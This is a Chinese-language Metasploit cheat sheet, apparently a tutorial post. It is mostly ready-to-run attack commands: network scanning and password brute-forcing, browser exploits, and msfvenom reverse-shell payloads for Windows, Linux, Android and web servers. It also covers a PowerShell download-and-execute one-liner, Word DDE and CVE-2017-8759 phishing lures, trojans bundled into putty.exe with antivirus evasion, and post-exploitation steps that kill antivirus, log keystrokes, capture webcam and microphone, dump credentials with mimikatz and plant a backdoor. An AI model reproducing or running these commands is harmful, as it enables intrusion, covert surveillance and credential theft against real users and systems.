## MSF 信息收集

Metasploit就是一个漏洞框架。它的全称叫做The Metasploit
Framework，简称叫做MSF。Metasploit作为全球最受欢迎的工具，不仅仅是因为它的方便性和强大性，更重要的是它的框架。它允许使用者开发自己的漏洞脚本，从而进行测试。![1659806404_62eea2c4da5f2d7e75654.jpg!small?1659806401600](https://image.3001.net/images/20220807/1659806404_62eea2c4da5f2d7e75654.jpg!small?1659806401600)

## 专业术语

  * 渗透攻击（exploit）
  * 测试者利用系统，程序，或服务的漏洞进行攻击的一个过程。
  * 攻击载荷（payload）
  * 攻击者在目标系统上执行的一段攻击代码，该代码具有返弹连接，创建用户，执行其他系统命令的功能
  * shellcode
  * 在目标机器上运行的一段机器指令，成功执行后会返回一个shell
  * 模块（module）
  * 是指Metasploit框架中所使用的一段软件代码组件。
  * 监听器（listener）
  * 监听器是metasploit中用来等待介入网络连接的组件。

## MSF基础知识

运行 msfconsole
即可打开msf命令控制接口![1659806425_62eea2d9136dada8cdf9e.jpg!small?1659806421740](https://image.3001.net/images/20220807/1659806425_62eea2d9136dada8cdf9e.jpg!small?1659806421740)

当打开msfconsole后，大家请看红色的方框。这里面清楚的标记了Metasploit所有的利用模块、payload等等

![1659806631_62eea3a7932b8c78e0310.jpg!small?1659806628297](https://image.3001.net/images/20220807/1659806631_62eea3a7932b8c78e0310.jpg!small?1659806628297)

## 全部参数的解释和利用

Help参数![1659806646_62eea3b6593d7ebc6d19b.jpg!small?1659806643075](https://image.3001.net/images/20220807/1659806646_62eea3b6593d7ebc6d19b.jpg!small?1659806643075)

#### 启动设置

  * service postgresql start
  * service metasploit start
  * msfconsole
  * 进入后输入db_status 查看数据库连接状态
  * workspace -a test 创一个工作台
  * 删除 -d 选项
  * 进入test工作台
  * Wordspace test
  * 使用nmap
  * db_nmap -sS 192.168.80.1 扫描主机
  * db_export 1.xml 导出扫描结果
  * db_import 1.xml 导入扫描结果
  * hosts 查看扫描结果

## 信息搜集

  *  **①whois查询** ：
  * msf > whois example.com
  * msf> whois 192.168.1.100
  *  **②http://searchdns.netcraft.com/在线收集服务器 IP信息工具**
  *  **③nslookup**
  * msf> db_nmap –sS –A192.168.1.111
  * msf> db_services #查看扫描结

### 高级扫描方式

  *  **①msf > use auxiliary/scanner/ip/ipidseq #IPID序列扫描器，与 nmap的-sI -O选项类似**
  * showoptions
  * set RHOSTS 192.168.1.0/24
  * set RPORT8080
  * setTHREADS 50
  * run
  * （ RHOSTS、 RPORT等参数也可以用小写）

#### 使用 portscan模块

  * msf> search postscan
  * msf> use auxiliary/scanner/postscan/syn
  * set RHOSTS 192.168.1.111
  * setTHREADS 50
  * run

#### 特定扫描

  * smb_version 模块：
  * msf> use auxiliary/scanner/smb/smb_version
  * showoptions
  * set RHOSTS 192.168.1.111
  * run
  * db_hosts –c address,os_flavor

#### 找 mssql 主机：

  * msf> use auxiliary/scanner/mssql/mssql_ping
  * showoptions
  * set RHOSTS 192.168.1.0/24
  * setTHREADS 255
  * run

#### SSH 服务器扫描：

  * msf> use auxiliary/scanner/ssh/ssh_version
  * set RHOSTS 192.168.1.0/24
  * setTHREADS 50
  * run

#### Telnet服务器扫描：

  * msf> use auxiliary/scanner/telnet/telnet_version
  * set RHOSTS 192.168.1.0/24
  * setTHREADS 50
  * run

#### FTP 主机扫描：

  * msf> use auxiliary/scanner/ftp/ftp_version
  * Show options
  * set RHOSTS 192.168.1.0/24
  * setTHREADS 255
  * run

#### 描 FTP 匿名登录：

  * useauxiliary/scanner/ftp/anonymos
  * set RHOSTS 192.168.1.0/24
  * setTHREADS 50
  * run

#### 扫描局域网内有哪些主机存活

  * use auxiliary/scanner/discovery/arp_sweep
  * set RHOSTS 192.168.1.0/24
  * set THREADS 50

run![1659806771_62eea4330e28c52f331e6.jpg!small?1659806767750](https://image.3001.net/images/20220807/1659806771_62eea4330e28c52f331e6.jpg!small?1659806767750)

扫描网站目录

  * auxiliary/scanner/http/dir_scanner
  * set RHOSTS 192.168.1.1
  * set THREADS 50

run![1659806778_62eea43a5b492fb71ae90.jpg!small?1659806775125](https://image.3001.net/images/20220807/1659806778_62eea43a5b492fb71ae90.jpg!small?1659806775125)搜索网站中的E-mail地址

  * search_email_collector
  * use auxiliary/gather/search_email_collector
  * set DOMAIN cracer.com
  * run

#### 嗅探抓包

  * msf> use auxiliary/sniffer/psnuffle
  * run

# MSF 密码破解

### ssh服务口令猜测

  * use auxiliary/scanner/ssh/ssh_login
  * set RHOSTS 192.168.80.134
  * set USERNAME root
  * set PASS_FILE /root/pass.txt
  * set THREADS 50
  * run

### mysql口令攻击

  * search mysql
  * use auxiliary/scanner/mysql/mysql_login
  * show options
  * set RHOSTS 192.168.80.130
  * set user_file /root/user.txt
  * set pass_file /root/pass.txt
  * exploit

### postgresql攻击

  * search postgresql
  * use auxiliary/scanner/postgres/postgres_login
  * show options
  * set RHOSTS 192.168.80.130
  * set user_file /root/user.txt
  * set pass_fiel /root/pass.txt
  * exploit

### tomcat 攻击

  * search tomcat
  * use auxiliary/scanner/http/tomcat_mgr_login
  * set RHOSTS 192.168.1.1
  * set PASS_FILE /root/pass.txt
  * set USER_FILE /root/user.txt
  * exploit

### telnet 攻击

  * use auxiliary/scanner/telnet/telnet_login
  * set 192.168.1.1
  * exploit

### samba攻击

  * use auxiliary/scanner/smb/smb_login
  * set RHOSTS 192.168.1.1 /192.168.1.0/24
  * set THREADS 200
  * exploit

# MSF 漏洞利用

### Metasploit 常用漏洞利用命令（一）

search <name>

用指定关键字搜索可利用漏洞

use <exploit name>

使用 _[漏洞](http://www.hack6.com/wzle/0ady/index.html)_

show options

显示选项

set <OPTION NAME> <option>

设置选项

show payloads 显示装置

### Metasploit 常用漏洞利用命令（二）

  * show targets 显示目标(os版本)
  * set TARGET <target number> 设置目标版本
  * exploit 开始漏洞 _[攻击](http://www.hack6.com/wzle/gf/)_
  * sessions -l 列出会话
  * sessions -i <ID> 选择会话
  * sessions -k <ID> 结束会话
  * <ctrl> z 把会话放到后台
  * <ctrl> c 结束会话

### Metasploit 常用漏洞利用命令（三）

  * show auxiliary 显示辅助模块
  * use <auxiliary name> 使用辅助模块
  * set <OPTION NAME> <option> 设置选项
  * run 运行模块

## ms10_002漏洞利用

  * use windows/browser/ms10_002_aurora
  * set payload windows/meterpreter/reverse_tcp
  * show options
  * set SRVPORT 80
  * set URIPATH /
  * set LHOST 192.168.2.128
  * set LPORT 444

exploit

## ms10_018漏洞利用

 **漏洞描述：**

Microsoft IE畸形对象操作内存破坏漏洞(MS10-018)

 **受影响系统：**

  * Microsoft Internet Explorer 7.0
  * Microsoft Internet Explorer 6.0 SP1
  * Microsoft Internet Explorer 6.0

 **Internet Explorer是Windows操作系统中默认捆绑的web浏览器**

Internet
Explorer通过使用dll组件提供对Web文件夹和打印的支持，该组件中存在释放后使用错误。如果用户加载了特制的HTML文档或Office文件，未经认证的远程攻击者就可以导致拒绝服务或执行任意代码。![1659806896_62eea4b0e19144ca1d7c1.jpg!small?1659806893626](https://image.3001.net/images/20220807/1659806896_62eea4b0e19144ca1d7c1.jpg!small?1659806893626)![1659806902_62eea4b61743e3855234b.jpg!small?1659806898857](https://image.3001.net/images/20220807/1659806902_62eea4b61743e3855234b.jpg!small?1659806898857)![1659806905_62eea4b94f173c6f36b7c.jpg!small?1659806901995](https://image.3001.net/images/20220807/1659806905_62eea4b94f173c6f36b7c.jpg!small?1659806901995)

![1659806952_62eea4e81c2b7dd8396d6.jpg!small?1659806948785](https://image.3001.net/images/20220807/1659806952_62eea4e81c2b7dd8396d6.jpg!small?1659806948785)![1659806967_62eea4f73258b48f7e81f.jpg!small?1659806963971](https://image.3001.net/images/20220807/1659806967_62eea4f73258b48f7e81f.jpg!small?1659806963971)![1659806972_62eea4fc2f4d950d65328.jpg!small?1659806968890](https://image.3001.net/images/20220807/1659806972_62eea4fc2f4d950d65328.jpg!small?1659806968890)![1659806991_62eea50f3e965292b8c1b.jpg!small?1659806987939](https://image.3001.net/images/20220807/1659806991_62eea50f3e965292b8c1b.jpg!small?1659806987939)
**客户端**![1659807004_62eea51c0592e4452c305.jpg!small?1659807000734](https://image.3001.net/images/20220807/1659807004_62eea51c0592e4452c305.jpg!small?1659807000734)

![1659807031_62eea537cbe3319f7ebf3.jpg!small?1659807028552](https://image.3001.net/images/20220807/1659807031_62eea537cbe3319f7ebf3.jpg!small?1659807028552)

![1659807051_62eea54b9ef7e946a0cc0.jpg!small?1659807048302](https://image.3001.net/images/20220807/1659807051_62eea54b9ef7e946a0cc0.jpg!small?1659807048302)
如上还有许多，请有兴趣的朋友自行收集搭建

复现

# MSF PAYLOAD

### msfvenom简介

  * msfvenom是msfpayload和msfencode的结合体，于2015年6月8日取代了msfpayload和msfencode。在此之后，metasploit-framework下面的的msfpayload（荷载生成器），msfencoder（编码器），msfcli（监听接口）都不再被支持。
  * msfvenom所有参数![1659807126_62eea596c09ba84ebbf25.jpg!small?1659807123527](https://image.3001.net/images/20220807/1659807126_62eea596c09ba84ebbf25.jpg!small?1659807123527)

### 常用参数

  * 比如想查看windows/meterpreter/reverse_tcp支持什么平台、哪些选项，可以使用msfvenom -p windows/meterpreter/reverse_tcp --list-options
  * msfvenom --list payloads可查看所有payloads
  * msfvenom --list encoders可查看所有编码器
    * 评级最高的两个encoder为cmd/powershell_base64和x86/shikata_ga_nai，其中x86/shikata_ga_nai也是免杀中使用频率最高的一个编码器
  * 类似可用msfvenom --list命令查看的还有payloads, encoders, nops, platforms, archs, encrypt, formats

### 监听参数

  * 防止假session
  * 在实战中，经常会遇到假session或者刚连接就断开的情况，这里补充一些监听参数，防止假死与假session。
  * msf exploit(multi/handler) > set ExitOnSession false
  * //可以在接收到seesion后继续监听端口，保持侦听。
  * 防止session意外退出
  * msf5 exploit(multi/handler) > set SessionCommunicationTimeout 0
  * //默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0
  * msf5 exploit(multi/handler) > set SessionExpirationTimeout 0
  * //默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭

### handler后台持续监听

  *  **msf exploit(multi/handler) > exploit -j -z**
  * 使用exploit -j -z可在后台持续监听,-j为后台任务，-z为持续监听，使用Jobs命令查看和管理后台任务。jobs -K可结束所有任务。
  * 还有种比较快捷的建立监听的方式，在msf下直接执行：
  *  **msf5 > handler -H 192.168.8.124 -P 1122 -p windows/meterpreter/reverse_tcp**

### payload的可持续化（这里更推荐cs）

  * 一般来说使用msfvenom生成的payload会单独开启一个进程，这种进程很容易被发现和关闭，在后期想做持久化的时候只能再使用migrate进行。
  * 其实在生成payload时可直接使用如下命令，生成的payload会直接注入到指定进程中。
  *  **msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -e x86/shikata_ga_nai -b "\x00" -i 5 -a x86 --platform win PrependMigrate=true PrependMigrateProc=svchost.exe -f exe -o exe**
  * 生成的shell程序执行后会启动两个进程exe和svchost.exe，关闭其中一个不会影响会话状态。
  * 在上面的生成payload参数中：
  * （1）PrependMigrate=true PrependMigrateProc=svchost.exe 使这个程序默认会迁移到exe进程，自己测试的时候不建议到这个进程而是其他的持久进程。
  * （2）使用-p指定使用的攻击载荷模块，使用-e指定使用x86/shikata_ga_nai编码器，使用-f选项告诉MSF编码器输出格式为exe，-o选项指定输出的文件名为exe，保存在根目录下。

### 各平台payload生成

  *  **Linux**
  * msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
  * msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -a x86 --platform Linux -f elf > shell.elf
  *  **Windows**
  * msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
  * msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -f exe > shell.exe
  *  **Mac**
  * msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
  *  **Android**
  * msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -f raw > shell.apk
  * msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 R > test.apk

### 生成脚本payload

  *  **Powershell**
  * msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=192.168.8.124 LPORT=1122 -e cmd/powershell_base64 -i 3 -f raw -o shell.ps1
  * Netcat
  *  **nc** **正向连接**
  * msfvenom -p windows/shell_hidden_bind_tcp LHOST=192.168.8.124 LPORT=1122 -f exe> 1.exe
  *  **nc** **反向连接，监听**
  * msfvenom -p windows/shell_reverse_tcp LHOST=192.168.8.124 LPORT=1122 -f exe> 1.exe

### 生成脚本payload

  *  **PHP**
  * msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
  * cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
  *  **ASP**
  * msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
  *  **JSP**
  * msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
  *  **WAR**
  * msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war

### 侦听Handlers

  * use exploit/multi/handler
  * set PAYLOAD <Payload name>
  * set LHOST 192.168.8.124
  * set LPORT 1122
  * set ExitOnSession false
  * exploit -j -z

### Powershell 配合msf无文件攻击

  *  **生成ps脚本**
  * msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1121 -f psh-reflection >x.ps1
  *  **设置侦听**
  * use exploit/multi/handler
  * set payload windows/x64/meterpreter/reverse_tcp
  * Set lhost 192.168.3.107
  * Run
  *  **客户端运行**
  * powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.8.1/x.ps1')

### Powershell配合word伪装木马执行

  * 新建word设置域，
  * ![1659807143_62eea5a71473e76bc51cf.png!small?1659807139751](https://image.3001.net/images/20220807/1659807143_62eea5a71473e76bc51cf.png!small?1659807139751)![1659807172_62eea5c45adf84886267b.jpg!small?1659807169036](https://image.3001.net/images/20220807/1659807172_62eea5c45adf84886267b.jpg!small?1659807169036)DDEAUTO C:\\\windows\\\system32\\\cmd.exe "/k powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.3.1/x.ps1') "

## msf使用宏钓鱼

git clone https://github.com/bhdresh/CVE-2017-8759.git

python cve-2017-8759_toolkit.py -M gen -w Invoice.rtf -u
http://192.168.73.129/logo.txt![1659807202_62eea5e290e97c324b0ad.jpg!small?1659807199271](https://image.3001.net/images/20220807/1659807202_62eea5e290e97c324b0ad.jpg!small?1659807199271)

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1133
-f exe >
/root/shell.exe![1659807210_62eea5eab3fd914dce97f.jpg!small?1659807207488](https://image.3001.net/images/20220807/1659807210_62eea5eab3fd914dce97f.jpg!small?1659807207488)

python cve-2017-8759_toolkit.py -M exp -e http://192.168.8.124/shell.exe -l
shell.exe![1659807215_62eea5ef857dce2484b7c.jpg!small?1659807212269](https://image.3001.net/images/20220807/1659807215_62eea5ef857dce2484b7c.jpg!small?1659807212269)

开启监听模块，发送给目标运行钓鱼文件，等代上线

![1659807219_62eea5f3801aaa75761c2.jpg!small?1659807216236](https://image.3001.net/images/20220807/1659807219_62eea5f3801aaa75761c2.jpg!small?1659807216236)![1659807233_62eea6012ed5314b026ba.png!small?1659807229875](https://image.3001.net/images/20220807/1659807233_62eea6012ed5314b026ba.png!small?1659807229875)

## msf制作excel钓鱼

  * use exploit/multi/script/web_delivery
  * set target 2
  * set payload windows/meterpreter/reverse_tcp
  * set LHOST 192.168.3.143
  * set URIPATH /
  * exploit![1659807265_62eea621314a608bad937.jpg!small?1659807261951](https://image.3001.net/images/20220807/1659807265_62eea621314a608bad937.jpg!small?1659807261951)

## 使用ngrock穿透内网

  * 设置ngrock隧道
  * 本机安装客户端
  * ./sunny clientid id号

## Msf5-Evasion模块免杀

  * 2019年1月，metasploit升级到了0，引入了一个新的模块叫Evasion模块，官方宣称这个模块可以创建反杀毒软件的木马。
  * evasion有以下几个模块,可以使用show evasion进行查看。

![1659807278_62eea62e595c4b66bc1db.jpg!small?1659807275107](https://image.3001.net/images/20220807/1659807278_62eea62e595c4b66bc1db.jpg!small?1659807275107)使用use
windows/windows_defender_exe进行生成payload

  * msf5 > use windows/windows_defender_exe
  * msf5 evasion(windows/windows_defender_exe) > set filename payload.exe
  * msf5 evasion(windows/windows_defender_exe) > set payload windows/meterpreter/reverse_tcp
  * msf5 evasion(windows/windows_defender_exe) > set LHOST 192.168.8.124
  * msf5 evasion(windows/windows_defender_exe) > set LPORT 1122
  * msf5 evasion(windows/windows_defender_exe) > run
  * 设置侦听
  * handler -H 10.211.55.2 -P 3333 -p windows/meterpreter/reverse_tcp

## 捆绑免杀

  *  **生成payload 捆绑exe**
  * msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -x putty.exe -f exe -o payload3.exe
  *  **捆绑编码免杀**
  * msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -e x86/shikata_ga_nai -x putty.exe -i 15 -f exe -o payload4.exe
  *  **多重编码免杀**
  * msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/call4_dword_xor -i 14 LHOST=192.168.8.124 LPORT=1122 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 13 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -b "&" -i 4 -f raw | msfvenom -a x86 --platform windows -e cmd/powershell_base64 -i 10 -x putty.exe -k -f exe > shell.exe
  * http://virustotal.com/ 验证静态免杀 bypass

## shellter免杀

  * shellcode代码注入工具
  * https://www.shellterproject.com/download/

## 免杀msfpayload

  * 生产py文件的payload
  * msfVENOM -p windows/x64/meterpreter/reverse_tcp LPORT=10003 LHOST=119.28.66.234 -e x86/shikata_ga_nai -i 17 -f py -o /root/121.py
  * 建立侦听![1659807302_62eea64647092e8f9857e.jpg!small?1659807299000](https://image.3001.net/images/20220807/1659807302_62eea64647092e8f9857e.jpg!small?1659807299000)

# MSF 后渗透模块

## 基本命令

  *  **进程迁移**
  * run post/windows/manage/migrate
  *  **关闭杀软**
  * run killav
  *  **通过其 shell 来关闭防火墙**
  * netsh adcfirewall set allprofiles state off
  *  **查看目标机所有流量**
  * run packetrecorder -i 1
  *  **提取系统信息**
  * run scraper
  *  **ps** **查看进程**
  * migrate 1774 切换进程
  *  **截屏** screenshot
  *  **获取系统运行的平台** sysinfo
  * run getgui -e **开启目标主机远程桌面**
  * sysinfo **命令为显示远程主机的系统信息**
  * execute -f notepad.exe
  * execute -h 显示帮助信息。-f为执行要运行的命令
  * 如果希望隐藏后台执行，加参数-H
  * execute -H -f notepad.exe
  *   

## 基本操作命令

  * cat c:\boot.ini#查看文件内容,文件必须存在
  * del c:\boot.ini #删除指定的文件
  * upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上，如upload exe C:\\\windows\\\system32\
  * download nimeia.txt /root/Desktop/ # 下载文件到本机上如：download C:\\\boot.ini /root/
  * edit c:\boot.ini # 编辑文件
  * getwd#打印工作目录
  * cd#更改本地目录
  * ls#列出在当前目录中的文件列表
  * pwd#输出工作目录
  * cd c:\\\ #进入目录文件下
  * rm file #删除文件
  * mkdir dier #在受害者系统上的创建目录
  * rmdir#受害者系统上删除目录
  * dir#列出目标主机的文件和文件夹信息
  * mv#修改目标主机上的文件名
  * search -d d:\\\www -f web.config #search 文件，如
  * search -d c:\\\ -f *.doc

run vnc 查看桌面

## 摄像头命令

  * record_mic #音频录制
  * webcam_chat #查看摄像头接口
  * webcam_list #查看摄像头列表
  * webcam_stream #摄像头视频获取

## 端口转发

  * portfwd -h
  * 用法：portfwd [-h] [add | delete | list | flush] [args]
  * 选项：
  * -L <opt>要监听的本地主机（可选）
  * -h帮助横幅
  * -l <opt>要监听的本地端口
  * -p <opt>连接到的远程端口
  * -r <opt>要连接到的远程主机
  *  **portfwd add -l 4444 -p 3389 -r 192.168.1.102** # 端口转发,本机监听4444,把目标机3389转到本机4444
  *  **rdesktop -u Administrator -p bk#123 127.0.0.1:4444** #使用rdesktop来连接桌面，-u 用户名 -p 密码
  * r **desktop 127.1.1.0:4444** #需要输入用户名和密码远程连接

## shell网络环境

  * meterpreter>run get_local_subnets
  * 添加一条通向目标服务器内网的路由
  * meterpreter>run autoroute -s 100.0.0.0/8 #(根据目标内网网络而定)
  * 查看路由设置：
  * meterpreter>run autoroute –p
  * 一般来说，在meterpreter中设置路由便可以达到通往其内网的目的。然而有些时候还是会失败，这时我们可以background返回msf>，查看下外面的路由情况
  * route print
  * 如果发现没有路由信息，说明meterpreter shell设置的路由并没有生效，我们可以在msf中添加路由。
  * msf>route add 10.0.0.0 255.0.0.0 1
  * 说明：1表示session 1，攻击机如果要去访问0.0.0/8网段的资源，其下一跳是session1，至于什么是下一条这里不多说了，反正就是目前攻击机可以访问内网资源了。

## 键盘记录

  * keyscan_start：开启键盘记录功能
  * keyscan_dump：显示捕捉到的键盘记录信息
  * keyscan_stop：停止键盘记录
  * add_user username password -h ip #在远程目标主机上添加一个用户
  * add_group_user "Domain Admins" username -h ip #将用户添加到目标主机的域管理员组中

## Hash获取

  * meterpreter > load mimikatz #加载mimikatz
  * meterpreter > msv #获取hash值
  * meterpreter > kerberos #获取明文
  * meterpreter >ssp #获取明文信息
  * meterpreter > wdigest #获取系统账户信
  * meterpreter >mimikatz_command -f a:: #必须要以错误的模块来让正确的模块显示
  * meterpreter >mimikatz_command -f hash:: #获取目标 hash
  * meterpreter > mimikatz_command -f samdump::hashes
  * meterpreter > mimikatz_command -f sekurlsa::searchPa
  *  **run post/windows/gather/smart_hashdump**

  

## 抓包嗅探

  * use sniffer # 加载嗅探模块
  * sniffer_interfaces #列出目标主机所有开放的网络接口
  * sniffer_start 2 #获取正在实施嗅探网络接口的统计数据
  * sniffer_dump 2 /tmp/test2.cap #在目标主机上针对特定范围的数据包缓冲区启动嗅探
  * sniffer_stop 2 #停止嗅探
  * 对抓取的包进行解包：
  * use auxiliary/sniffer/psnuffle
  * set pcapfile 1.cap
  * run
  * wireshark，加载这个/tmp/xpsp1.cap 也可

## 盗取令牌

  * meterpreter >use incognito 加载incoginto功能（用来盗窃目标主机的令牌或是假冒用户)
  * meterpreter >list_tokens -u 列出目标主机用户的可用令牌
  * meterpreter >list_tokens -g 列出目标主机用户组的可用令牌
  * meterpreter >impersonate_token DOMAIN_NAME\\\USERNAME 假冒目标主机上的可用令牌,如meterpreter > impersonate_token QLWEB\\\Administrato

## 持久控制服务器

  * 前提条件服务器系统可以
  * run metsvc 安装后门
  * msfconsole
  * use exploit/multi/handler
  * set payload windows/metsvc_bind_tcp
  * set LPORT 31337
  * set RHOST 192.168.2.131
  * run

部分模块因更新原因，新版kali中的metasploit可能不支持部分操作，若测试失败建议更换至20或21版kali

